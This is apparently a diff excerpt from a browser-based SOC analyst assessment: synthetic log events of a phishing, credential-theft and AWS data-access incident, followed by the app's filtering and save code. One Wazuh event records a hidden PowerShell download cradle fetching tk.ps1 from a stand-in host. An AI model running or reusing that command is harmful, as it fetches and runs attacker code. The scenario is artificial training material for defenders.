+{id:"E039",ts:B+" 09:30:00 BDT",src:"Sysmon",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"Sysmon 1 Process Creation",sev:"Low",raw:"EventID=1  TimeCreated=2026-08-27T09:30:00.442 (UTC+06:00)\nImage=powershell.exe  ParentImage=C:\\Windows\\explorer.exe\nCommandLine=powershell.exe -File C:\\IT\\Scripts\\Get-StaleADAccounts.ps1 -Days 90 -OutFile C:\\IT\\Reports\\stale.csv\nUser=FINSEC\\a.karim"},
+
+/* --- Wazuh (UTC) --- */
+{id:"E041",ts:B+" 03:12:44 UTC",src:"Wazuh",host:"SRV-WEB01",user:"-",sip:"185.220.101.47",dip:"203.0.113.25",proc:"sshd",evt:"Rule 5710 — sshd: attempt to login using a non-existent user",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T03:12:44.117Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"5710\",\"level\":5,\"description\":\"sshd: attempt to login using a non-existent user\"},\"agent\":{\"name\":\"SRV-WEB01\"},\"data\":{\"srcip\":\"185.220.101.47\",\"srcuser\":\"admin\",\"dstport\":\"22\"},\"location\":\"/var/log/auth.log\"}"},
+{id:"E042",ts:B+" 03:12:58 UTC",src:"Wazuh",host:"SRV-WEB01",user:"-",sip:"185.220.101.47",dip:"203.0.113.25",proc:"sshd",evt:"Rule 5712 — SSHD brute force attempt (multiple failures)",sev:"High",raw:"{\"timestamp\":\"2026-08-27T03:12:58.902Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"5712\",\"level\":10,\"description\":\"sshd: brute force trying to get access to the system\",\"mitre\":{\"id\":[\"T1110\"],\"technique\":[\"Brute Force\"]}},\"agent\":{\"name\":\"SRV-WEB01\"},\"data\":{\"srcip\":\"185.220.101.47\",\"attempts\":\"2417\",\"successful_logins\":\"0\",\"users_tried\":\"admin,root,test,oracle,ubuntu,deploy\"}}"},
+{id:"E043",ts:B+" 03:14:02 UTC",src:"Wazuh",host:"SRV-WEB01",user:"-",sip:"185.220.101.47",dip:"203.0.113.25",proc:"active-response",evt:"Rule 651 — Host blocked by firewall-drop active response",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T03:14:02.331Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"651\",\"level\":3,\"description\":\"Host Blocked by firewall-drop Active Response\"},\"data\":{\"srcip\":\"185.220.101.47\",\"duration\":\"86400\"},\"note\":\"no successful authentication observed from this address at any point in the retention window\"}"},
+{id:"E044",ts:B+" 07:15:00 UTC",src:"Wazuh",host:"SRV-APP02",user:"-",sip:"10.20.9.200",dip:"10.20.5.31",proc:"vulnerability-detector",evt:"Rule 23503 — Vulnerability detected (CVE-2025-41207)",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T07:15:00.004Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"23503\",\"level\":7},\"vulnerability\":{\"cve\":\"CVE-2025-41207\",\"package\":\"openssl 3.0.11\",\"severity\":\"High\",\"status\":\"Active\"},\"agent\":{\"name\":\"SRV-APP02\"}}"},
+{id:"E046",ts:B+" 08:05:11 UTC",src:"Wazuh",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"Rule 91801 — PowerShell execution policy bypass",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T08:05:11.220Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"91801\",\"level\":8,\"description\":\"Powershell execution policy bypass\",\"mitre\":{\"id\":[\"T1059.001\"]}},\"agent\":{\"name\":\"IT-WKS-003\"},\"data\":{\"user\":\"a.karim\"},\"analyst_note\":\"host is enrolled in the ITAM automation group; change record CHG-4471 covers 2026-08-27 maintenance\"}"},
+{id:"E047",ts:B+" 09:52:10 UTC",src:"Wazuh",host:"IT-WKS-003",user:"FINSEC\\a.karim",sip:"10.20.14.3",dip:"-",proc:"powershell.exe",evt:"Rule 91802 — Encoded PowerShell command detected",sev:"High",raw:"{\"timestamp\":\"2026-08-27T09:52:10.780Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"91802\",\"level\":12,\"description\":\"Encoded PowerShell command detected — possible obfuscation\",\"mitre\":{\"id\":[\"T1059.001\",\"T1027\"],\"technique\":[\"PowerShell\",\"Obfuscated Files or Information\"]}},\"agent\":{\"name\":\"IT-WKS-003\"},\"data\":{\"win\":{\"eventdata\":{\"parentImage\":\"C:\\\\Windows\\\\CCM\\\\CcmExec.exe\",\"user\":\"FINSEC\\\\a.karim\"}}},\"decoder\":\"windows_eventchannel\",\"note\":\"rule matches on the -EncodedCommand switch only; the decoded payload is not evaluated by this rule\"}"},
+{id:"E048",ts:B+" 09:58:02 UTC",src:"Wazuh",host:"IdP-Cloud",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"identity-provider",evt:"Rule 60204 — Sign-in from unfamiliar location",sev:"High",raw:"{\"timestamp\":\"2026-08-27T09:58:02.441Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"60204\",\"level\":10,\"description\":\"Successful sign-in from a location not previously seen for this account\"},\"data\":{\"user\":\"r.hasan@finsecure.example\",\"srcip\":\"45.133.203.14\",\"geo\":\"NL, Amsterdam\",\"asn\":\"AS200000 hosting/VPS provider\",\"result\":\"success\",\"mfa\":\"not challenged — device marked compliant via existing session claim\",\"useragent\":\"Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\"},\"note\":\"previous 90 days of sign-ins for this account originate from 198.51.100.77 (Dhaka office egress)\"}"},
+{id:"E049",ts:B+" 10:02:57 UTC",src:"Wazuh",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"aws-cloudtrail",evt:"Rule 80200 — AWS console sign-in without MFA from unusual location",sev:"Critical",raw:"{\"timestamp\":\"2026-08-27T10:02:57.118Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"80200\",\"level\":12,\"description\":\"AWS console sign-in without MFA from an unusual location\",\"mitre\":{\"id\":[\"T1078.004\"],\"technique\":[\"Valid Accounts: Cloud Accounts\"]}},\"data\":{\"aws\":{\"accountId\":\"482910337541\",\"eventName\":\"ConsoleLogin\",\"sourceIPAddress\":\"45.133.203.14\"}}}"},
+{id:"E050",ts:B+" 10:07:31 UTC",src:"Wazuh",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"aws-cloudtrail",evt:"Rule 80301 — IAM access key created",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T10:07:31.660Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"80301\",\"level\":8,\"description\":\"IAM long-term access key created\",\"mitre\":{\"id\":[\"T1098.001\"],\"technique\":[\"Account Manipulation: Additional Cloud Credentials\"]}},\"data\":{\"aws\":{\"eventName\":\"CreateAccessKey\",\"targetUser\":\"svc-fin-reporting\",\"sourceIPAddress\":\"45.133.203.14\"}},\"note\":\"rule level is 8 because key creation is common in this account; see automation baseline\"}"},
+{id:"E051",ts:B+" 10:12:41 UTC",src:"Wazuh",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"91.219.236.18",proc:"powershell.exe",evt:"Rule 91805 — PowerShell download cradle",sev:"High",raw:"{\"timestamp\":\"2026-08-27T10:12:41.215Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"91805\",\"level\":12,\"description\":\"PowerShell in-memory download and execute (download cradle)\",\"mitre\":{\"id\":[\"T1059.001\",\"T1105\"],\"technique\":[\"PowerShell\",\"Ingress Tool Transfer\"]}},\"agent\":{\"name\":\"FIN-WKS-042\"},\"data\":{\"win\":{\"eventdata\":{\"commandLine\":\"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-updates.example/tk.ps1')\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\"}}}}"},
+{id:"E052",ts:B+" 10:13:02 UTC",src:"Wazuh",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"schtasks.exe",evt:"Rule 92213 — Scheduled task created",sev:"High",raw:"{\"timestamp\":\"2026-08-27T10:13:02.670Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"92213\",\"level\":10,\"description\":\"Scheduled task created from a script interpreter\",\"mitre\":{\"id\":[\"T1053.005\"],\"technique\":[\"Scheduled Task\"]}},\"data\":{\"taskName\":\"EdgeUpdateTaskUserS-1-5-21-4471\",\"interval\":\"5 minutes\"}}"},
+{id:"E053",ts:B+" 10:22:14 UTC",src:"Wazuh",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"aws-cloudtrail",evt:"Rule 80202 — S3 object read volume anomaly",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T10:22:14.556Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"80202\",\"level\":7,\"description\":\"S3 GetObject volume for this principal exceeds 30-day baseline\"},\"data\":{\"bucket\":\"finsecure-fin-reports\",\"objects_read\":\"51\",\"baseline_daily_avg\":\"4\",\"bytes\":\"318447221\"},\"note\":\"CloudTrail data events record object reads; they do not record where the data was sent afterwards\"}"},
+{id:"E054",ts:B+" 10:41:33 UTC",src:"Wazuh",host:"FIN-WKS-042",user:"FINSEC\\r.hasan",sip:"10.20.14.42",dip:"-",proc:"syscheck",evt:"Rule 554 — File added to the system (FIM)",sev:"High",raw:"{\"timestamp\":\"2026-08-27T10:41:33.020Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"554\",\"level\":10,\"description\":\"File added to the system\"},\"syscheck\":{\"path\":\"C:\\\\Users\\\\r.hasan\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\upd.ps1\",\"size\":\"11482\",\"sha256\":\"C7A15E93B0D26F48A1E30C95B7248DF60E1A9C3B5D827640FE9A1C0B3D57E284\",\"mtime\":\"2026-08-27T10:12:44Z\"},\"note\":\"first scan cycle after creation; FIM interval on this agent is 30 minutes\"}"},
+{id:"E055",ts:B+" 11:05:44 UTC",src:"Wazuh",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"-",dip:"-",proc:"email-integration",evt:"Rule 100210 — User-reported phishing message",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T11:05:44.910Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"100210\",\"level\":6,\"description\":\"User reported a message using the Report Phishing button\"},\"data\":{\"reporter\":\"r.hasan@finsecure.example\",\"message_id\":\"<a41f9c02-7b3e-4d18@finsecure-support.example>\",\"reported_delay_minutes\":\"111\"}}"},
+{id:"E057",ts:B+" 12:41:22 UTC",src:"Wazuh",host:"SRV-WEB01",user:"msp_admin",sip:"203.0.113.199",dip:"203.0.113.25",proc:"sshd",evt:"Rule 5501 — PAM session opened",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T12:41:22.771Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"5501\",\"level\":3,\"description\":\"PAM: Login session opened\"},\"data\":{\"srcip\":\"203.0.113.199\",\"user\":\"msp_admin\",\"auth\":\"publickey\"},\"note\":\"203.0.113.199 = NorthBridge MSP jump host (CMDB MSP-JMP-01); key-based access, allow-listed\"}"},
+{id:"E058",ts:B+" 13:12:00 UTC",src:"Wazuh",host:"SRV-WEB01",user:"-",sip:"10.20.9.200",dip:"203.0.113.25",proc:"nginx",evt:"Rule 31151 — Multiple web server 404 errors from same source",sev:"Medium",raw:"{\"timestamp\":\"2026-08-27T13:12:00.118Z\",\"tz\":\"UTC\",\"rule\":{\"id\":\"31151\",\"level\":10,\"description\":\"Multiple web server 400 error codes from same source ip\"},\"data\":{\"srcip\":\"10.20.9.200\",\"count\":\"1844\"},\"note\":\"source is the internal vulnerability scanner, weekly web application audit\"}"},
+
+/* --- Firewall (UTC) --- */
+{id:"E064",ts:B+" 09:31:11 UTC",src:"Firewall",host:"FW-DNS-01",user:"-",sip:"10.20.14.42",dip:"10.20.5.10",proc:"-",evt:"DNS query logged",sev:"Medium",raw:"time=2026-08-27T09:31:11Z (UTC)\nclient=10.20.14.42 query=account-verification.example type=A response=172.67.188.94\nresolver=10.20.5.10  category=\"newly registered domain\"  first_seen_by_feed=2026-08-21  action=resolved"},
+{id:"E065",ts:B+" 09:31:13 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"172.67.188.94",proc:"-",evt:"ALLOW outbound tcp/443",sev:"Medium",raw:"action=allow proto=tcp src=10.20.14.42 dst=172.67.188.94 dport=443 bytes_out=8842 bytes_in=41221 nat_src=198.51.100.77\ntime=2026-08-27T09:31:13Z (UTC)  category=\"newly registered domain\"  url_filter=monitor-only\nnote=TLS inspection is not enabled on this egress path; request and response bodies are not recorded"},
+{id:"E067",ts:B+" 10:12:42 UTC",src:"Firewall",host:"FW-DNS-01",user:"-",sip:"10.20.14.42",dip:"10.20.5.10",proc:"-",evt:"DNS query logged",sev:"High",raw:"time=2026-08-27T10:12:42Z (UTC)\nclient=10.20.14.42 query=cdn-updates.example type=A response=91.219.236.18\ncategory=\"uncategorized\"  first_seen_by_feed=2026-08-19  action=resolved"},
+{id:"E068",ts:B+" 10:12:43 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"91.219.236.18",proc:"-",evt:"ALLOW outbound tcp/80",sev:"High",raw:"action=allow proto=tcp src=10.20.14.42 dst=91.219.236.18 dport=80 bytes_out=412 bytes_in=11482 nat_src=198.51.100.77\ntime=2026-08-27T10:12:43Z (UTC)  http_method=GET  uri=/tk.ps1  user_agent=\"Mozilla/5.0 (Windows NT 10.0) WindowsPowerShell/5.1.19041.4291\""},
+{id:"E069",ts:B+" 10:18:44 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"91.219.236.18",proc:"-",evt:"ALLOW outbound tcp/443",sev:"High",raw:"action=allow proto=tcp src=10.20.14.42 dst=91.219.236.18 dport=443 bytes_out=1104 bytes_in=980 nat_src=198.51.100.77\ntime=2026-08-27T10:18:44Z (UTC)  session_duration=2s"},
+{id:"E070",ts:B+" 10:23:45 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"91.219.236.18",proc:"-",evt:"ALLOW outbound tcp/443",sev:"High",raw:"action=allow proto=tcp src=10.20.14.42 dst=91.219.236.18 dport=443 bytes_out=1118 bytes_in=964 nat_src=198.51.100.77\ntime=2026-08-27T10:23:45Z (UTC)  session_duration=2s"},
+{id:"E071",ts:B+" 10:28:46 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"91.219.236.18",proc:"-",evt:"ALLOW outbound tcp/443",sev:"High",raw:"action=allow proto=tcp src=10.20.14.42 dst=91.219.236.18 dport=443 bytes_out=1210 bytes_in=1002 nat_src=198.51.100.77\ntime=2026-08-27T10:28:46Z (UTC)  session_duration=3s"},
+{id:"E074",ts:B+" 12:30:19 UTC",src:"Firewall",host:"FW-EDGE-01",user:"-",sip:"10.20.14.42",dip:"91.219.236.18",proc:"-",evt:"DENY outbound tcp/8443",sev:"High",raw:"action=deny proto=tcp src=10.20.14.42 dst=91.219.236.18 dport=8443 count=6 nat_src=198.51.100.77\ntime=2026-08-27T12:30:19Z (UTC)\nrule=EDGE-OUT-TI-BLOCK  threat_feed=\"commodity C2 infrastructure\" feed_updated=2026-08-27T12:20Z\nnote=this destination was permitted before the feed update at 12:20Z"},
+
+/* --- AWS CloudTrail (UTC) --- */
+{id:"E075",ts:B+" 02:00:11 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"svc-ci-deploy",sip:"10.20.5.90",dip:"-",proc:"terraform",evt:"CreateAccessKey",sev:"Low",raw:"{\"eventTime\":\"2026-08-27T02:00:11Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateAccessKey\",\"awsRegion\":\"ap-southeast-1\",\"sourceIPAddress\":\"10.20.5.90\",\"userAgent\":\"aws-sdk-go/1.55.5 (terraform/1.9.2)\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"svc-ci-deploy\"},\"requestParameters\":{\"userName\":\"svc-ci-deploy\"},\"vpcEndpointId\":\"vpce-0af12bc9\",\"note\":\"scheduled credential rotation pipeline, runs daily 02:00Z\"}"},
+{id:"E078",ts:B+" 08:31:02 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"198.51.100.77",dip:"-",proc:"console",evt:"ConsoleLogin (success)",sev:"Informational",raw:"{\"eventTime\":\"2026-08-27T08:31:02Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"sourceIPAddress\":\"198.51.100.77\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.0.0\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::482910337541:assumed-role/AWSReservedSSO_FinanceAnalyst_9d1c/r.hasan@finsecure.example\"},\"additionalEventData\":{\"MFAUsed\":\"Yes\",\"MobileVersion\":\"No\"},\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"note\":\"198.51.100.77 = Dhaka office egress NAT address\"}"},
+{id:"E080",ts:B+" 10:02:44 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"ConsoleLogin (success)",sev:"Critical",raw:"{\"eventTime\":\"2026-08-27T10:02:44Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"awsRegion\":\"ap-southeast-1\",\"sourceIPAddress\":\"45.133.203.14\",\"userAgent\":\"Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::482910337541:assumed-role/AWSReservedSSO_FinanceAnalyst_9d1c/r.hasan@finsecure.example\"},\"additionalEventData\":{\"MFAUsed\":\"No\",\"SamlProviderArn\":\"arn:aws:iam::482910337541:saml-provider/FinSecureIdP\"},\"responseElements\":{\"ConsoleLogin\":\"Success\"}}"},
+{id:"E081",ts:B+" 10:03:12 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"GetCallerIdentity",sev:"Medium",raw:"{\"eventTime\":\"2026-08-27T10:03:12Z\",\"eventSource\":\"sts.amazonaws.com\",\"eventName\":\"GetCallerIdentity\",\"sourceIPAddress\":\"45.133.203.14\",\"userAgent\":\"Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::482910337541:assumed-role/AWSReservedSSO_FinanceAnalyst_9d1c/r.hasan@finsecure.example\"}}"},
+{id:"E082",ts:B+" 10:04:07 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"ListBuckets",sev:"Medium",raw:"{\"eventTime\":\"2026-08-27T10:04:07Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"ListBuckets\",\"sourceIPAddress\":\"45.133.203.14\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::482910337541:assumed-role/AWSReservedSSO_FinanceAnalyst_9d1c/r.hasan@finsecure.example\"},\"responseElements\":null}"},
+{id:"E083",ts:B+" 10:05:52 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"ListObjectsV2",sev:"Medium",raw:"{\"eventTime\":\"2026-08-27T10:05:52Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"ListObjectsV2\",\"sourceIPAddress\":\"45.133.203.14\",\"requestParameters\":{\"bucketName\":\"finsecure-fin-reports\",\"prefix\":\"2026/Q2/\"}}"},
+{id:"E084",ts:B+" 10:07:29 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"CreateAccessKey",sev:"Critical",raw:"{\"eventTime\":\"2026-08-27T10:07:29Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateAccessKey\",\"sourceIPAddress\":\"45.133.203.14\",\"userAgent\":\"Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::482910337541:assumed-role/AWSReservedSSO_FinanceAnalyst_9d1c/r.hasan@finsecure.example\"},\"requestParameters\":{\"userName\":\"svc-fin-reporting\"},\"responseElements\":{\"accessKey\":{\"accessKeyId\":\"AKIAQ7X2LMFN4TDEXAMP\",\"status\":\"Active\",\"userName\":\"svc-fin-reporting\"}}}"},
+{id:"E085",ts:B+" 10:09:41 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"GetObject",sev:"High",raw:"{\"eventTime\":\"2026-08-27T10:09:41Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"GetObject\",\"sourceIPAddress\":\"45.133.203.14\",\"requestParameters\":{\"bucketName\":\"finsecure-fin-reports\",\"key\":\"2026/Q2/consolidated_pnl.xlsx\"},\"additionalEventData\":{\"bytesTransferredOut\":4118220}}"},
+{id:"E086",ts:B+" 10:11:03 UTC",src:"AWS CloudTrail",host:"aws-finance",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"console",evt:"GetObject",sev:"High",raw:"{\"eventTime\":\"2026-08-27T10:11:03Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"GetObject\",\"sourceIPAddress\":\"45.133.203.14\",\"requestParameters\":{\"bucketName\":\"finsecure-fin-reports\",\"key\":\"2026/Q2/customer_accounts_export.csv\"},\"additionalEventData\":{\"bytesTransferredOut\":88214470}}"},
+
+/* --- Email Security (UTC) --- */
+{id:"E087",ts:B+" 07:44:00 UTC",src:"Email Security",host:"mail-gateway",user:"multiple",sip:"91.203.145.9",dip:"-",proc:"gateway",evt:"Inbound message quarantined",sev:"Medium",raw:"verdict=QUARANTINE  recipients=6  time=2026-08-27T07:44:00Z (UTC)\nfrom=billing@invoice-portal-eu.example  subject=\"Outstanding invoice 88214\"\nspf=fail dkim=fail dmarc=fail  reason=\"credential phishing pattern + newly registered domain\"\nclicks=0"},
+{id:"E089",ts:B+" 09:14:02 UTC",src:"Email Security",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"185.199.229.61",dip:"-",proc:"gateway",evt:"Inbound message delivered (policy override)",sev:"High",raw:"verdict=DELIVERED  time=2026-08-27T09:14:02Z (UTC)\nmessage_id=<a41f9c02-7b3e-4d18@finsecure-support.example>\nheader_from=security-alert@finsecure-support.example\nenvelope_from=bounce-0912@mail-relay-eu4.example\nreply_to=it-verify@mail-relay-eu4.example\nsubject=\"Urgent: Your account will be suspended\"\nspf=softfail dkim=none dmarc=fail (p=quarantine)\noverride_rule=ALLOW-PARTNER-FINSECURE-*  note=wildcard allow-list entry matches any sender domain beginning \"finsecure-\"\nattachments=0  links=1"},
+{id:"E090",ts:B+" 09:14:02 UTC",src:"Email Security",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"-",dip:"-",proc:"url-rewrite",evt:"URL rewritten for click tracking",sev:"Medium",raw:"time=2026-08-27T09:14:02Z (UTC)\ndisplay_url=https://login.finsecure-security.example/verify\nresolved_final_url=https://account-verification.example/finsecure/login\nredirect_chain=login.finsecure-security.example -> account-verification.example\ndomain_age=6 days  registrar_privacy=enabled\ntls_cert=DV issued 2026-08-21, CN=account-verification.example, SAN has no finsecure.example entry"},
+{id:"E091",ts:B+" 09:16:33 UTC",src:"Email Security",host:"mail-gateway",user:"j.begum@finsecure.example; s.roy@finsecure.example",sip:"185.199.229.61",dip:"-",proc:"gateway",evt:"Same campaign delivered to additional mailboxes",sev:"High",raw:"verdict=DELIVERED  time=2026-08-27T09:16:33Z (UTC)\ncampaign_id=CMP-2026-0827-01  same header_from and message body as <a41f9c02-7b3e-4d18@finsecure-support.example>\nrecipients=j.begum@finsecure.example, s.roy@finsecure.example\nclicks_recorded=0  reported=0"},
+{id:"E092",ts:B+" 09:20:15 UTC",src:"Email Security",host:"mail-gateway",user:"a.karim@finsecure.example",sip:"203.0.113.88",dip:"-",proc:"gateway",evt:"Inbound message delivered with attachment",sev:"Informational",raw:"verdict=CLEAN  time=2026-08-27T09:20:15Z (UTC)\nfrom=accounts@northbridge-msp.example  subject=\"August managed services invoice\"\nspf=pass dkim=pass dmarc=pass\nattachment=invoice_aug.pdf sha256=1D4F7A20E9C3B85614A0D2E7F9C13B08A5E60D24F7B9C3A180E5D2C6B4A93F71\nsandbox_verdict=benign  opened=2026-08-27T09:26:11Z"},
+{id:"E093",ts:B+" 09:31:09 UTC",src:"Email Security",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"198.51.100.77",dip:"-",proc:"url-rewrite",evt:"URL click recorded — ALLOWED",sev:"High",raw:"time=2026-08-27T09:31:09Z (UTC)\nuser=r.hasan@finsecure.example  action=ALLOWED\nurl=https://account-verification.example/finsecure/login\nsource_ip=198.51.100.77 (corporate egress NAT — individual workstation not identified in this log)\nuser_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.0.0\nnote=click tracking records the request only; it cannot observe what the user did on the destination page"},
+{id:"E095",ts:B+" 10:47:12 UTC",src:"Email Security",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"45.133.203.14",dip:"-",proc:"mailbox-audit",evt:"Inbox rule created",sev:"High",raw:"time=2026-08-27T10:47:12Z (UTC)  operation=New-InboxRule  result=Success\nmailbox=r.hasan@finsecure.example  client_ip=45.133.203.14\nrule_name=\".\"  conditions={BodyContainsWords: [\"verify\",\"password\",\"security alert\",\"suspicious\"]}\nactions={MoveToFolder: \"RSS Feeds\", MarkAsRead: true}\nuser_agent=Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"},
+{id:"E096",ts:B+" 11:05:41 UTC",src:"Email Security",host:"mail-gateway",user:"r.hasan@finsecure.example",sip:"198.51.100.77",dip:"-",proc:"gateway",evt:"Message reported as phishing by user",sev:"Medium",raw:"time=2026-08-27T11:05:41Z (UTC)\nreporter=r.hasan@finsecure.example\nmessage_id=<a41f9c02-7b3e-4d18@finsecure-support.example>\nuser_comment=\"I clicked this earlier and it asked me to log in twice, then nothing happened. Probably fake?\"\nremediation=not yet actioned"}
+];
+
+/* ---------- state ---------- */
+let S = {
+  started:false, startedAt:null, deadline:null, finalDeadline:null,
+  dataLocked:false, locked:false, submitted:false,
+  answers:{}, choices:{}, ranks:{}, checks:{}, cand:{name:"",email:""}
+};
+const $  = s=>document.querySelector(s);
+const $$ = s=>Array.from(document.querySelectorAll(s));
+const esc = s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+
+function toast(msg){ const t=$("#toast"); t.textContent=msg; t.style.display="block"; clearTimeout(t._h); t._h=setTimeout(()=>t.style.display="none",2200); }
+
+/* ---------- persistence ---------- */
+let saveTimer=null;
+function queueSave(){ clearTimeout(saveTimer); saveTimer=setTimeout(save,400); }
+async function save(){
+  await Store.set(KEY, JSON.stringify(S));
+  $("#saveChip").textContent = "saved "+new Date().toLocaleTimeString([], {hour12:false});
+}
+async function load(){
+  const v = await Store.get(KEY);
+  if(!v) return;
+  try{ S = Object.assign(S, JSON.parse(v)); }catch(e){ return; }
+  $$("textarea[data-a]").forEach(t=>{ if(S.answers[t.dataset.a]!=null) t.value=S.answers[t.dataset.a]; });
+  $$("[data-choice]").forEach(g=>{ const v2=S.choices[g.dataset.choice]; if(v2) g.querySelectorAll(".choice").forEach(b=>b.classList.toggle("on",b.dataset.val===v2)); });
+  $$("select[data-rank]").forEach(s=>{ if(S.ranks[s.dataset.rank]) s.value=S.ranks[s.dataset.rank]; });
+  $$("[data-ck]").forEach(c=>{ c.checked=!!S.checks[c.dataset.ck]; c.closest(".check").classList.toggle("done",c.checked); });
+  $("#candName").value=S.cand.name||""; $("#candEmail").value=S.cand.email||"";
+  if(S.started){ $("#gate").classList.add("hidden"); }
+  refreshCounters(); updateProgress(); checkRanks(); syncAi();
+  if(S.started && S.finalDeadline && Date.now()>=S.finalDeadline) lockAll(true);
+  else if(S.started && S.deadline && Date.now()>=S.deadline) lockData(true);
+}
+
+/* ---------- table ---------- */
+function uniq(k){ return [...new Set(EVENTS.map(e=>e[k]).filter(v=>v && v!=="-"))].sort(); }
+function fillSelect(sel,vals){ vals.forEach(v=>{ const o=document.createElement("option"); o.value=v; o.textContent=v; sel.appendChild(o); }); }
+fillSelect($("#fSource"), uniq("src"));
+fillSelect($("#fHost"),   uniq("host"));
+fillSelect($("#fUser"),   uniq("user"));
+fillSelect($("#fSev"),    ["Critical","High","Medium","Low","Informational"]);
+
+let openRows = new Set();
+
+function filtered(){
+  const q=$("#q").value.trim().toLowerCase();
+  const fs=$("#fSource").value, fv=$("#fSev").value, fh=$("#fHost").value, fu=$("#fUser").value;
+  return EVENTS.filter(e=>{
+    if(fs && e.src!==fs) return false;
+    if(fv && e.sev!==fv) return false;
+    if(fh && e.host!==fh) return false;
+    if(fu && e.user!==fu) return false;
+    if(!q) return true;
+    return (e.id+" "+e.ts+" "+e.src+" "+e.host+" "+e.user+" "+e.sip+" "+e.dip+" "+e.proc+" "+e.evt+" "+e.raw).toLowerCase().includes(q);
+  });
+}
+function render(){
+  const rows=filtered();
+  const tb=$("#tbody");
+  tb.innerHTML = rows.map(e=>{
